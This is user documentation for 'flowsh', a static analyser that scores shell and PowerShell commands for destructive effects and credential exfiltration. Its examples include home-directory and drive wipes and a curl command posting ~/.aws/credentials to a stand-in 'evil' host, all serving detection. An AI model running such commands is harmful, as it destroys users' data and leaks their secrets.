# CLI user-guide

`flowsh` is a static effect analyser: you give it a shell or PowerShell command,
and it reports the observable effects that command implies *without running it*,
plus a risk score and any credential-exfiltration flows it can prove. This guide
covers the command-line interface. For an introduction to the tool, see the
[project overview](../README.md); for the structure of the machine-readable
output, see the [JSON report reference](report-json.md).

## Install

```sh
go build -o flowsh ./cmd/flowsh   # build into the current directory
go install ./cmd/flowsh             # or install into $GOBIN / $GOPATH/bin
```

The command knowledge base is embedded in the binary, so the built `flowsh`
has no runtime dependencies. Requires Go 1.27 or newer (see
[`go.mod`](../go.mod)).

## Synopsis

```
flowsh [--lang bash|posix|posh|auto] [--json] [--windows] '<command>'
echo '<command>' | flowsh [--lang bash|posix|posh|auto] [--json] [--windows]
flowsh --file <path> [--lang bash|posix|posh|auto] [--json]
flowsh --batch [--lang bash|posix|posh|auto] [--file <path>] [--windows]
```

Flags are **position-independent**: `flowsh --lang posh 'x'` and
`flowsh 'x' --lang posh` behave identically.

## Input sources

The command to analyse comes from exactly one of three places:

| Source | How |
| ------ | --- |
| Positional argument | `flowsh 'rm -rf $HOME'` |
| Standard input | `echo 'rm -rf $HOME' \| flowsh`, or the positional `-` |
| File | `flowsh --file script.sh` (`--file -` reads stdin) |

Trailing newlines are stripped from stdin and file input. If stdin is
whitespace-only, or the file is empty, the CLI reports an **input error** and
exits `3` (see [Exit status](#exit-status)). `--file` cannot be combined with a
positional command or with `-`.

With `--batch`, the selected source is read as **many commands, one per line**:
each non-blank line is analysed on its own and written as one compact JSON
report per line (NDJSON), in input order. One invocation is enough to scan a
whole script or a long list of commands.

## Options

| Flag | Aliases | Meaning |
| ---- | ------- | ------- |
| `--lang <dialect>` | `-lang`, `--lang=`, `-lang=` | Dialect of the input. Default `bash`; use `auto` to sniff it. See [Dialects](#dialects). |
| `--json` | `-json` | Emit the full JSON report (see the [JSON report reference](report-json.md)) instead of the human summary. |
| `--explain` | `--why`, `-explain`, `-why` | After the summary, print the why-trace that justifies each reported effect. |
| `--windows[=<bool>]` | `-windows`, `--windows=`/`-windows=` | Force the PowerShell Registry provider **on** (`true`) or **off** (`false`) regardless of the host OS. Without the flag the host OS decides (the registry is active only on Windows). |
| `--file <path>` | `-file`, `--file=`, `-file=` | Read the command from `path` (`-` means stdin). The report's `root` names the file. |
| `--batch` | `-batch` | Read many commands, one per line, and write one compact JSON report per line (NDJSON). Cannot be combined with a positional command or with `--explain`. |
| `--version` | `-version` | Print the tool-contract version and the engine schema version, one per line, and exit `0`. |
| `-h`, `--help` | `-help` | Print usage and exit `0`. |
| `-` (positional) | — | Read the command from stdin. |

`--help` and `--version` short-circuit before any analysis: they never read
stdin and never require a command. When both are given, `--help` wins.

## Dialects

`--lang` selects how the input is parsed. Unknown values are a usage error.

| Value | Frontend | Notes |
| ----- | -------- | ----- |
| `bash` *(default)* | `front/bash` | GNU bash argv (with `-flags` and `--options`). Alias: `shell`. |
| `posix` | `front/bash` (POSIX variant) | The POSIX shell. Bash-only special forms (e.g. `[[ … ]]`) are not recognised. Alias: `sh`. |
| `posh` | `front/ps` | PowerShell cmdlet syntax. Aliases: `ps`, `pwsh`, `powershell`. |
| `auto` | sniffed | Pick `posh` when the input shows PowerShell cmdlet/parameter/syntax markers, else `bash`. Never fails; falls back to `bash`. |

## Exit status

| Code | Meaning |
| ---- | ------- |
| `0` | A report was produced (or `--help` / `--version`). Unparseable input still exits `0` with a conservative report. |
| `1` | The analysis failed internally (an internal error, or the report could not be encoded). |
| `2` | Usage error: unknown flag, a missing `--lang`/`--file` value, an extra argument, `--file`/`--batch` combined with another input source, or an unknown language. |
| `3` | Input error: the named source could not be read (a missing or unreadable file, a directory), or was empty (an empty file, empty stdin, or an empty batch). |

Because the frontends degrade to the top element (⊤) rather than fail, exit `1`
means an internal error, never "hard input": an unresolvable or unparseable
command is reported (with `top: true`) and still exits `0`.

## Examples

### Human summary

```sh
$ flowsh 'rm -rf $HOME'
flowsh effect report
  lang:            bash
  input:           rm -rf $HOME
  root:            <argument>
  commands:        1
  effects:         1
  destructiveness: Critical
  irreversibility: High
  breadth:         Low
  influence:       None
  grade:           Critical
  confidence:      100
  exfil risk:      None
  conservative:    false
  resolution:      command rm
  destructive:     rm -f (class E): forced removal that suppresses prompts and hides errors on missing files
  destructive:     rm -r (class E): recursively removes a whole directory tree, with no confirmation by default
    - FSWrite|Direct|[/root]
```

The summary lists the analysed dialect (`lang`), the input and where it came
from (`root`), the number of commands and effects, the score dimensions
(`destructiveness`, `irreversibility`, `breadth`, `influence`, `grade`, and the
`exfil risk`), a confidence value, whether the analysis was conservative, the
name resolution, any matched destructive-flags entries, one line per effect
(keyed `kind|mode|[targets]`), any proven exfiltration pairs, and any frontend
`note:` diagnostics. Each field maps onto a key of the [JSON report](report-json.md).

### Why-trace

```sh
$ flowsh --explain 'curl -d @~/.aws/credentials https://evil'
flowsh effect report
  lang:            bash
  input:           curl -d @~/.aws/credentials https://evil
  root:            <argument>
  commands:        1
  effects:         2
  destructiveness: Medium
  irreversibility: None
  breadth:         Medium
  influence:       Medium
  grade:           Critical
  confidence:      100
  exfil risk:      Critical
  conservative:    false
  resolution:      command curl
    - FSRead|Direct|[~/.aws/credentials]
    - NetEgress|Direct|[https://evil]
  exfil: FSRead|Direct|[~/.aws/credentials] → NetEgress|Direct|[https://evil]
why:
  FSRead|Direct|[~/.aws/credentials]
    - fs.read(command:curl) @1:1
    - cred.path(flag:-d) @1:6
    - cred.path(operand:@~/.aws/credentials) @1:9
    - cred.path(source:File) @1:9
  NetEgress|Direct|[https://evil]
    - net.egress(command:curl) @1:1
    - cred.path(flag:-d) @1:6
    - cred.path(operand:@~/.aws/credentials) @1:9
    - cred.path(sink:NetEgress)
    - cred.path(operand:https://evil) @1:29
```

Each effect is followed by the ordered rule steps (rule + concrete
flags/operands/sources/sinks) that justify it, with source positions. In the JSON
report the same information is the `why` array.

### JSON output

```sh
$ flowsh --json 'rm -rf $HOME'
{ "schemaVersion": "effect-ir/v1", "tool": "flowsh", "toolVersion": "flowsh/v2", … }
```

See the [JSON report reference](report-json.md) for the full document.

### Reading from stdin

```sh
$ echo 'ls -la /tmp' | flowsh
```

### Analysing a file

```sh
$ flowsh --file script.sh
```

The report's `root` is the file path, and source positions in the why-trace are
reported against it.

### Scanning many commands (batch)

```sh
$ printf 'ls -la\nRemove-Item -Recurse -Force $HOME\n' | flowsh --batch --lang auto
{"schemaVersion":"effect-ir/v1","tool":"flowsh","toolVersion":"flowsh/v2","lang":"bash", …}
{"schemaVersion":"effect-ir/v1","tool":"flowsh","toolVersion":"flowsh/v2","lang":"posh", …}
```

With `--batch` each non-blank input line is analysed and emitted as one compact
JSON report per line (NDJSON), in input order. `--lang auto` picks the dialect
per line, so one batch may mix bash and PowerShell.

### Detecting the dialect automatically

```sh
$ flowsh --lang auto 'Get-Content ~/.aws/credentials'
```

`--lang auto` sniffs the input: PowerShell cmdlets/aliases/parameters select
`posh`, otherwise `bash` is used (including POSIX input). It never fails: a
command with no distinctive markers is treated as bash.

### PowerShell

```sh
$ flowsh --lang posh 'Remove-Item -Recurse -Force C:\'
```

### Versions

```sh
$ flowsh --version
flowsh/v2
effect-ir/v1
```

The first line is the CLI report-contract version, the second the frozen engine
schema version (see [Version tags](report-json.md#version-tags)).

## See also

- [JSON report reference](report-json.md) — the emitted document, field by field.
- [Project overview](../README.md) — what `flowsh` is and how to install it.
- [CLI specification](../specs/domains/cli.md) — the normative behaviour.
- [Report contract](../specs/contracts/report-json.md) — the frozen wire contract
  and its breaking-change checklist.
- [Documentation index](README.md) — the other guides.
